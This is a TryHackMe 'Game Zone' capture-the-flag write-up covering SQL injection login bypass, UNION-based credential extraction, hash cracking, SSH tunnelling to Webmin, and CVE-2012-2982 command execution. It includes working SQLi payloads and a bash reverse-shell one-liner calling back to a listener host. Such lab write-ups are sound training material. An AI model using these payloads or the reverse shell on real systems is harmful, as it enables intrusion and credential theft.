# Game Zone - TryHackMe

> **Kill Chain Summary**:
> Port Scanning (Ports 22, 80) -> Web Authentication Bypass via SQL Injection (`' OR 1=1-- -`) -> Search Portal UNION-Based SQL Injection -> Extraction of User Credentials from Database -> SHA-256 Hash Cracking via CrackStation -> SSH Authentication as `agent47` -> Local Service Enumeration (`ss -tulpn` identifying Webmin on port 10000) -> SSH Local Port Forwarding -> Credential Reuse on Webmin Dashboard -> Webmin Authenticated RCE (CVE-2012-2982) -> Root Shell (`root`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Game Zone |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu 16.04) |
| **Difficulty** | Easy / Medium |
| **Status** | Rooted |
| **Key Techniques** | SQL Injection (Auth Bypass & UNION-Based), Hash Cracking, Local Port Enumeration, SSH Tunneling, Webmin RCE (CVE-2012-2982) |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was executed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.10.160.80 10.10.160.80
```

**Open Ports:**
- **Port 22:** OpenSSH 7.2p2 (Ubuntu Linux)
- **Port 80:** Apache httpd 2.4.18 (Ubuntu)

### 1.2 Web Application Enumeration

Navigating to `http://10.10.160.80/` displays a gaming review portal with a user login form on the home page.

---

## 2. Initial Access

### 2.1 SQL Injection Authentication Bypass

Testing standard SQL injection payloads against the username field on the login form:

```sql
' OR 1=1-- -
```

Leaving the password field empty or with arbitrary text bypasses authentication, granting access to an internal game search portal (`portal.php`).

### 2.2 UNION-Based SQL Injection & Data Extraction

The search function on `portal.php` sends parameters that are concatenated directly into backend SQL queries.

#### Step 1: Determining Column Count
Using `ORDER BY` clauses to determine the number of projected columns:

```sql
' ORDER BY 1-- -   (Success)
' ORDER BY 2-- -   (Success)
' ORDER BY 3-- -   (Success)
' ORDER BY 4-- -   (Error: Unknown column '4' in 'order clause')
```

The underlying query returns **3 columns**.

#### Step 2: Mapping Output Positions
Test column reflection:

```sql
' UNION SELECT 1,2,3-- -
```

Columns 2 and 3 reflect directly on the results page.

#### Step 3: Enumerating Database Tables
Extract table names from `information_schema.tables`:

```sql
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
```

Output:
```text
post, users
```

#### Step 4: Extracting Credentials
Extract usernames and password hashes from the `users` table:

```sql
' UNION SELECT 1,group_concat(username, 0x3a, password),3 FROM users-- -
```

Output:
```text
agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
```

### 2.3 Hash Cracking and SSH Login

The extracted hash is a SHA-256 digest:
- **Username:** `agent47`
- **Hash:** `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

Cracking the hash via CrackStation or Hashcat (mode 1400):
- **Plaintext Password:** `videogamer124`

Authenticate via SSH:

```bash
ssh agent47@10.10.160.80
```

Provide password `videogamer124` when prompted:

```bash
agent47@gamezone:~$ id
uid=1000(agent47) gid=1000(agent47) groups=1000(agent47)
```

Retrieve the user flag:

```bash
cat /home/agent47/user.txt
```

```text
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Local Service Enumeration

Check active local listening ports using `ss` or `netstat`:

```bash
ss -tulpn
```

```text
Netid  State   Recv-Q  Send-Q    Local Address:Port    Peer Address:Port
tcp    LISTEN  0       128       127.0.0.1:10000            *:*
tcp    LISTEN  0       128               *:80               *:*
tcp    LISTEN  0       128               *:22               *:*
```

Port **10000** is listening exclusively on localhost (`127.0.0.1`). This port commonly hosts **Webmin**, a web-based system administration tool.

### 3.2 SSH Local Port Forwarding

Establish an SSH tunnel to forward remote port 10000 to local port 10000 on Kali:

```bash
ssh -L 10000:localhost:10000 agent47@10.10.160.80
```

Navigating to `http://localhost:10000/` displays the Webmin login interface (version 1.580).

### 3.3 Webmin Authenticated RCE (CVE-2012-2982)

Testing credential reuse with the recovered credentials:
- **Username:** `agent47`
- **Password:** `videogamer124`

Authentication succeeds.

> [!NOTE] Concept: CVE-2012-2982 (Webmin /file/show.cgi Remote Command Execution)
> Webmin versions 1.580 and prior contain an authenticated command execution flaw in `/file/show.cgi`. The parameter fails to sanitize shell metacharacters, allowing authenticated administrative users to execute arbitrary commands with root privileges.

Using a standalone Python exploit targeting CVE-2012-2982:

```bash
python3 webmin_cve_2012_2982.py http://localhost:10000 -u agent47 -p videogamer124 -c "id"
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Trigger a reverse shell back to a Netcat listener on port 4444:

```bash
nc -lvnp 4444
```

```bash
python3 webmin_cve_2012_2982.py http://localhost:10000 -u agent47 -p videogamer124 -c "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
```

The reverse shell connects back running as `root`:

```text
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.160.80] 39182
root@gamezone:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Retrieve the root flag:

```bash
cat /root/root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# SQL Injection Authentication Bypass
' OR 1=1-- -

# Extract Table Names via UNION-Based SQLi
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -

# Extract Column Values via UNION-Based SQLi
' UNION SELECT 1,group_concat(username, 0x3a, password),3 FROM users-- -

# Local Port Enumeration
ss -tulpn

# SSH Local Port Forwarding Tunnel
ssh -L <LOCAL_PORT>:localhost:<REMOTE_PORT> <USER>@<REMOTE_IP>
```

---

## 5. Key Takeaways and Lessons Learned

1. **Systematic SQLi Methodology:** Progressing methodically from authentication bypass (`' OR 1=1-- -`) to determining column count (`ORDER BY`), identifying reflected columns, and extracting database schemas is the standard manual exploitation procedure.
2. **Local Port Discovery:** Internal services bound only to `127.0.0.1` are often legacy management tools (like Webmin) left unpatched because administrators assume they are shielded from external networks.
3. **Pivoting via SSH Port Forwarding:** Local port forwarding (`ssh -L`) transforms internal network isolation into direct local access, permitting the use of browser tools and automated exploit scripts.

---

#tryhackme #linux #easy #sqli #union-sqli #crackstation #ssh #credential-reuse #ss #ssh-tunneling #port-forwarding #webmin #cve-2012-2982 #privesc
